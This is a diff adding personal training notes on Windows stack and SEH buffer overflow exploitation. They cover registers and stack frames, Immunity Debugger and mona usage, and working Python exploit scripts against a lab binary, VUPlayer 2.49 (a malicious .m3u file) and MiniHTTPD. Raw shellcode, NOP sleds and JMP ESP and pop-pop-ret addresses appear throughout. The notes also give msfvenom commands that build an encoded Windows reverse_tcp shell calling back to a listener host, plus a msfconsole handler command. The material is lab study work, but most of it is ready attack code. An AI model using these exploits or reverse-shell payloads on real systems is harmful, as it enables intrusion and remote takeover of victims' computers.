@@ -1,0 +1,394 @@
+Offensive Software Exploitation (OSE)
+
+An Instruction is the lowest execution term for the CPU, while
+a Statement is a high-level term that is compiled and then loaded 
+as one or many instructions
+
+
+CPU Registers Overview
+
+16 Bits		32 Bits		64 Bits		Description
+AX		EAX		RAX		Accumulator
+BX		EBX		RBX		Base Index
+CX		ECX		RCX		Counter
+DX		EDX		RDX		Data
+BP		EBP		RBP		Base Pointer
+SP		ESP		RSP		Stack Pointer
+IP		EIP		RIP		Instruction Pointer
+SI		ESI		RSI		Source Index Pointer
+DI		EDI		RDI		Destination Index Pointer
+
+Registers I'll be most concerned with in training:
+	EBP
+	ESP
+	EIP
+
+A stack frome is represented by two pointers:
+	Base pointer (saved in EBP register): the memory address is 
+		equal to (EBP-1) is the first memory location of the 
+		stack frame
+
+	Stack pointer (saved in ESP register): the memory address 
+		that is equal to (ESP) is the top memory location 
+		of the stack frame
+
+When Pushing or Popping values, ESP register value is changed (the
+	stack pointer moves)
+
+Base Pointer (value of EBP) never change unless the current Stack 
+	Frame is changed.
+
+The stack frame is empty when EBP value = ESP value
+
+Search programs for these to call when inserting shellcode
+JMP ESP
+CALL ESP
+PUSH ESP
+	Can also try to JMP, CALL or PUSH ESI if ESP starts with \x00 which is a null byte
+
+gcc.exe -o test.exe -O3 -m32 -I "C:\MinGW\include" -L "C:\MinGW\lib" -static-libgcc -f no-stack-protector
+
+SEH -> Structured Exception Handler -> where programs try to keep from crashing
+	The SEH chain is often called FS:[0] chain as well
+
+#################################################################################################################
+Exploit test.exe
+
+Plugin for Immunity Debugger
+https://github.com/corelan/mona
+	copy mona.py to C:\Program Files (x86)\Immunity Inc\Immunity Debugger\PyCommands
+	mkdir c:\mona
+
+	In Immunity:
+		!mona					#shows mona commands
+		!mona config -set workingfolder c:\mona
+
+		!mona pattern_create 1200		#create a cyclic pattern of a given size
+			copy ASCII pattern from c:\mona\pattern
+			paste into buf variable in python code below
+**********************************************************************************************************		
+Python code:
+import subprocess
+
+#shellcode length = 113
+shellcode=("\xdd\xc1\xb8\x7d\x5f\x6b\x07\xd9\x74\x24\xf4\x5d\x29\xc9\xb1"
+"\x13\x31\x45\x1a\x83\xed\xfc\x03\x45\x16\xe2\x88\xdc\x8f\xfb"
+"\x43\x31\x1d\x6c\xc0\xd4\xce\x0f\x52\x4e\x5d\x81\x3e\xfb\x13"
+"\x11\x35\x8d\xdf\xda\x3f\x7e\x4d\x57\x8f\xf5\xf3\x70\x64\x56"
+"\x30\x0a\x26\x52\x30\x87\xa2\xbb\xe0\x96\xb4\x4f\xb4\x87\x6c"
+"\x5f\x82\x94\x7b\x1d\xae\x49\x02\x9d\x29\xc5\x6d\xb0\x70\x9c"
+"\x9d\xc7\x0f\x41\x41\xd9\x11\x7e\x45\x77\x12\x56")
+
+# JMP ESP = 77C1181C (ntdll.dll)
+#buf = ("A"*28) + ("\x1C\x18\xC1\x77") + ("\x90" * 10) + shellcode
+buf = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9"
+
+print "Buffer: ", buf, " Buffer length: ", len(buf)
+
+p1 = subprocess.Popen(["C:\Program Files (x86)\Immunity Inc\Immunity Debugger\ImmunityDebugger.exe", "test.exe", buf],
+#p1 = subprocess.Popen(["test.exe", buf],
+                      stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+stdout, stderr = p1.communicate()
+print stdout, stderr
+
+**********************************************************************************************************		
+
+Run python code
+
+then:
+	!mona pattern_offset <address of EIP from running python code>  #may have to hit F9 couple of times
+		look for value returned in red ...found in cyclic pattern at position <value>
+	
+In Immunity get the "JMP ESP" address
+	View Menu -> Executable Modules
+	Double click ntdll
+	right click -> search for -> command
+		JMP ESP
+		copy address (i.e. 77C1181c)
+	
+change python code to:
+	buf = ("A"*<value from cyclic pattern above>) + "<address in little indian hex>" + ("\x90"*10) + shellcode
+		address will look like "\x1c\x18\xC1\x77"
+
+	if calculator launches change python code again:
+		p1 = subprocess.Popen(["test.exe", buf],
+
+
+################################################################################################################
+vuplayer 2.49
+
+python code:
+
+	junk = "\x41" * 3000
+	payload = junk
+	f = open("bad.m3u", "w")
+	f.write(payload)
+	f.close()
+	print "File bad.m3u created successfully!"
+
+!mona config -set workingfolder C:\mona
+!mona pattern_create 3000
+!mona pattern_offset <address retruned in EIP from crash>
+	get position in bytes from response (1012)
+
+
+More Python code:
+
+	junk = "\x41" * 1012
+	eip = "\x42" * 4		#will override EIP with BBBB
+	pad1 = "\x43" * 1984		#1984 is (3000 - 1012 - 4) used for padding
+
+	payload = junk + eip + pad1
+
+	f = open("bad.m3u", "w")
+	f.write(payload)
+	f.close()
+	print "File bad.m3u created successfully!"
+	print "Payload length = ", len(payload)
+
+
+More python code to write the exploit:
+	# get JMP ESP from NTDLL
+
+	junk = "\x41" * 1012
+	eip = "\x34\x10\xBC\x77"	#address for JMP ESP
+	nops1 = "\x90" * 8		#overwrite with NOPs
+	shellcode=("\xdd\xc1\xb8\x7d\x5f\x6b\x07\xd9\x74\x24\xf4\x5d\x29\xc9\xb1"
+	"\x13\x31\x45\x1a\x83\xed\xfc\x03\x45\x16\xe2\x88\xdc\x8f\xfb"
+	"\x43\x31\x1d\x6c\xc0\xd4\xce\x0f\x52\x4e\x5d\x81\x3e\xfb\x13"
+	"\x11\x35\x8d\xdf\xda\x3f\x7e\x4d\x57\x8f\xf5\xf3\x70\x64\x56"
+	"\x30\x0a\x26\x52\x30\x87\xa2\xbb\xe0\x96\xb4\x4f\xb4\x87\x6c"
+	"\x5f\x82\x94\x7b\x1d\xae\x49\x02\x9d\x29\xc5\x6d\xb0\x70\x9c"
+	"\x9d\xc7\x0f\x41\x41\xd9\x11\x7e\x45\x77\x12\x56")
+	pad1 = "\x90" * 1877
+
+	payload = junk + eip + nops1 + shellcode + pad1
+
+	f = open("bad.m3u", "w")
+	f.write(payload)
+	f.close()
+	print "File bad.m3u created successfully!"
+	print "Payload length = ", len(payload)
+
+################################################################################################################
+
+
+Create shellcode:
+msfvenom -p windows/shell/reverse_tcp LHOST=192.168.1.184 LPORT=443 EXITFUNC=process - x86/shikata_ga_nai -f c -b '\x00\x0b\x09\x0c\x20\x1A\x0a\x0d\x22'	
+	# -b is bad characters not to use in the shellcode
+	# 192.168.1.184 is the kali host that will be running the listener
+	# x86/shikata_ga_ani is the encoder to use for the payload
+
+Create listener on Kali:
+sudo msfconsole -x "use exploit/multi/handler; set payload windows/shell/reverse_tcp; set LHOST 192.168.1.184; set LPORT 443; set EXITFUNC process; run"
+
+################################################################################################################
+
+MiniHTTPD
+
+Python code to fuzz http server:
+
+	import socket
+	import struct
+
+	payload = "A"*10000
+
+	print "[+] sending payload, length ", len(payload)
+
+	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+	s.connect(("192.168.1.227", 80))
+
+	buf = (
+	        "GET /" + payload + " HTTP/1.1\r\n" +
+	        "Host: 192.168.1.227" +
+	        "\r\n\r\n"
+	)
+	
+	s.send(buf)
+	s.close()
+"
+Open Immunity Debugger as Administrator, File -> attach to process -> minihttpd
+
+
+msf-pattern_create -l 10000
+	copy output
+
+change payload in above script to payload = "output from msf-pattern_create"
+Run new python script
+	Note EIP when access violation occurs
+		(i.e. 78473778)
+msf-pattern_offset -q <memory address of EIP>
+	[*] Exact match at offset 5392
+
+	make note of the offset
+
+
+find CALL ESP, JMP ESP or PUSH ESP in program or ntdll
+	(i.e. 777A181C)
+	In Immunity get the "JMP ESP" address
+		View Menu -> Executable Modules
+		Double click ntdll
+		right click -> search for -> command
+			JMP ESP
+			copy address (i.e. 777A181C)
+
+
+Change python script above to:
+	payload = "A" * <offset> + "BBBB" + "C"*<10000-offset-4>
+
+Check EIP at crash point. Does it contain BBBB/42424242? If so, we know here to insert our NOPs to begin reverse shell
+
+Change python script to:
+	payload = "A" * <offset> + "<little indian of JMP ESP. i.e. \x1C\x18\x7a\x77" + "\x90"*<10000 minus offset minus 4"
+
+	Does NOPs show up in the dump and/or stack?
+
+
+Create shellcode:
+msfvenom -p windows/shell/reverse_tcp LHOST=192.168.1.184 LPORT=443 EXITFUNC=process -e x86/shikata_ga_nai -f c -b '\x00\x0b\x09\x0c\x20\x1A\x0a\x0d'	
+	# -b is bad characters not to use in the shellcode x00 -> null bype, x20 -> space
+	# 192.168.1.184 is the kali host that will be running the listener
+	# x86/shikata_ga_ani is the encoder to use for the payload
+
+Create listener on Kali:
+sudo msfconsole -x "use exploit/multi/handler; set payload windows/shell/reverse_tcp; set LHOST 192.168.1.184; set LPORT 443; set EXITFUNC process; run"
+
+Change Python script to include shellcode from above
+	shellcode = (<shellcode>)	(1632 bytes???)
+	payload = "A" * <offset> + "<little indian of JMP ESP" + "\x90"*8 + shellcode
+
+
+################################################################################################################
+
+
+SEH -> Structured Exception Handler -> where programs try to keep from crashing
+	The SEH chain is often called FS:[0] chain as well
+
+To view the SEH Chain in Immunity Debugger:
+	!mona sehchain
+		0x0019ffcc	0x0019ffe4	0x77ab2540	ntdll.dll+0x00072540
+		0x0019ffe4	0xffffffff	0x77abec71	ntdll.dll_0x0007ec71
+						   ^^^^
+	Looking at the stack we can see these addresses 	
+		0019FFC8  |00000000  ....
+		0019FFCC  |0019FFE4  äÿ.  Pointer to next SEH record
+		0019FFD0  |77AB2540  @%«w  SE handler
+		0019FFD4  |972C1241  A,—
+		0019FFD8  |00000000  ....
+		0019FFDC  \0019FFEC  ìÿ.
+		0019FFE0   77AA2FFA  ú/ªw  RETURN to ntdll.77AA2FFA from ntdll.77AA2FFD
+		0019FFE4   FFFFFFFF  ÿÿÿÿ  End of SEH chain
+		0019FFE8   77ABEC71  qì«w  SE handler
+		0019FFEC   00000000  ....
+		0019FFF0   00000000  ....
+		0019FFF4   0040139D  @.  seh_test.<ModuleEntryPoint>
+
+	FFFFFFFF means it is the end of the SEH chain
+
+
+!mona bpseh	#set a breakpoint on all current SEH Handler function pointers
+
+Putting in 1000 "A"s will overwrite the SEH. How do we know the offset or number of "A"s to create payload
+
+!mona config -set workingfolder C:\Mona
+	if you don't do this it should create output in your working directory
+!mona pattern_create 1000
+open file C:\Mona\pattern.txt
+
+replace buf = ("A"*1000) with output of pattern_create
+Take note of the address in EIP where the program exception occured (i.e. 62413961)
+
+!mona pattern_offset <address from EIP i.e 62413961>
+	look for output in Red
+		Pattern a9Ab (0x62413961) found in cyclic pattern at position 28
+
+replace buf = "<pattern output>" with buf = ("A"*28) + "BBBB" + ("C"*968)
+	Run to program crash / access violation, etc.
+	EIP should be 42424242
+
+	Registers:
+		EAX 00000000
+		ECX 42424242
+		EDX 77ABEB10 ndtll.77ABEB10
+		EBX 00000000
+		ESP 0019F378
+		EBP 0019F398
+		ESI 00000000
+		EDI 00000000
+
+	Stack (right click ESP and follow in stack):
+		0019F378   77ABEAF2  òê«w  RETURN to ntdll.77ABEAF2
+		0019F37C   0019F478  xô.
+		0019F380   0019FEFC  üþ.  ASCII "CCCCBBBBCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC"...
+		0019F384   0019F4C8  Èô.
+		0019F388   0019F400  .ô.
+		0019F38C   0019F93C  <ù.  Pointer to next SEH record
+		0019F390   77ABEB10  ë«w  SE handler
+		0019F394   0019FEFC  üþ.  ASCII "CCCCBBBBCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC"...
+		0019F398  /0019F460  `ô.
+		0019F39C  |77ABEAC4  Äê«w  RETURN to ntdll.77ABEAC4 from ntdll.77ABEACC
+		0019F3A0  |0019F478  xô.
+		0019F3A4  |0019FEFC  üþ.  ASCII "CCCCBBBBCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC"...
+		0019F3A8  |0019F4C8  Èô.
+		0019F3AC  |0019F400  .ô.
+		0019F3B0  |42424242  BBBB
+		0019F3B4  |0019F4C8  Èô.
+		0019F3B8  |0019F478  xô.
+		0019F3BC  |00000000  ....
+		0019F3C0  |77AA2AFA  ú*ªw  RETURN to ntdll.77AA2AFA from ntdll.77ABEA90
+		0019F3C4  |0019F478  xô.
+		0019F3C8  |0019FEFC  üþ.  ASCII "CCCCBBBBCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC"...
+		0019F3CC  |0019F4C8  Èô.
+		0019F3D0  |0019F400  .ô.
+		0019F3D4  |42424242  BBBB
+		0019F3D8  |00000000  ....
+
+	Notice ESP points to the top of the stack 0019F378 but our payload is in 0019F380 (which is ESP + 8)
+	So, we need to either find an "ESP + 8" or a "pop pop return" (pop pop return jumps the two)
+
+	!mona seh		#outputs to a file called seh.txt
+
+	-----------------------------------------------------------------------------------------------------------------------------------------
+	 Module info :
+	-----------------------------------------------------------------------------------------------------------------------------------------
+	 Base       | Top        | Size       | Rebase | SafeSEH | ASLR  | NXCompat | OS Dll | Version, Modulename & Path
+	-----------------------------------------------------------------------------------------------------------------------------------------
+	 0x75670000 | 0x75854000 | 0x001e4000 | True   | True    | True  |  False   | True   | 10.0.17134.376 [KERNELBASE.dll] (C:\WINDOWS\System32\KERNELBASE.dll)
+	 0x76020000 | 0x7613e000 | 0x0011e000 | True   | True    | True  |  False   | True   | 10.0.17134.319 [ucrtbase.dll] (C:\WINDOWS\System32\ucrtbase.dll)
+	 0x00400000 | 0x00405000 | 0x00005000 | False  | False   | False |  False   | False  | -1.0- [seh_test.exe] (C:\labs\SEH\seh_test.exe)
+	 0x75940000 | 0x75a20000 | 0x000e0000 | True   | True    | True  |  False   | True   | 10.0.17134.376 [KERNEL32.DLL] (C:\WINDOWS\System32\KERNEL32.DLL)
+	 0x69ef0000 | 0x69f05000 | 0x00015000 | True   | True    | True  |  False   | True   | 14.34.31931.0 [VCRUNTIME140.dll] (C:\WINDOWS\SYSTEM32\VCRUNTIME140.dll)
+	 0x77a40000 | 0x77bd0000 | 0x00190000 | True   | True    | True  |  False   | True   | 10.0.17134.228 [ntdll.dll] (C:\WINDOWS\SYSTEM32\ntdll.dll)
+	-----------------------------------------------------------------------------------------------------------------------------------------
+	0x00401353 : pop ecx # pop ecx # ret  | startnull,ascii {PAGE_EXECUTE_READ} [seh_test.exe] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\labs\SEH\seh_test.exe)
+	0x0040103d : pop esi # pop ebp # ret  | startnull,ascii {PAGE_EXECUTE_READ} [seh_test.exe] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\labs\SEH\seh_test.exe)
+	0x00401153 : pop esi # pop ebp # ret  | startnull,ascii {PAGE_EXECUTE_READ} [seh_test.exe] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\labs\SEH\seh_test.exe)
+	0x004013f2 : pop esi # pop ebp # ret  | startnull {PAGE_EXECUTE_READ} [seh_test.exe] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\labs\SEH\seh_test.exe)
+	0x004014e0 : pop esi # pop ebp # ret  | startnull {PAGE_EXECUTE_READ} [seh_test.exe] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\labs\SEH\seh_test.exe)
+	0x0040190e : pop esi # pop ebx # ret  | startnull,ascii {PAGE_EXECUTE_READ} [seh_test.exe] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\labs\SEH\seh_test.exe)
+	0x0040193a : pop esi # pop ebx # ret  | startnull,asciiprint,ascii {PAGE_EXECUTE_READ} [seh_test.exe] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\labs\SEH\seh_test.exe)
+	0x004018c1 : pop esi # pop ebp # ret 0x04 | startnull {PAGE_EXECUTE_READ} [seh_test.exe] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\labs\SEH\seh_test.exe)
+
+	You can see the pop pop ret. You can also right click in the main Immunity Debugger Window -> Search For -> Sequence of commands
+		then put in:
+			pop r32
+			pop r32
+			ret
+
+Need to jump past 0019FEFF to NOPs
+0019FEFC   43               INC EBX
+0019FEFD   43               INC EBX
+0019FEFE   43               INC EBX
+0019FEFF   43               INC EBX
+0019FF00   0E               PUSH CS
+0019FF01   1955 44          SBB DWORD PTR SS:[EBP+44],EDX
+0019FF04   90               NOP
+0019FF05   90               NOP
+0019FF06   90               NOP
+0019FF07   90               NOP
+
+	"\xeb\x08\x90\x90"
+		
+
+
+################################################################################################################ 
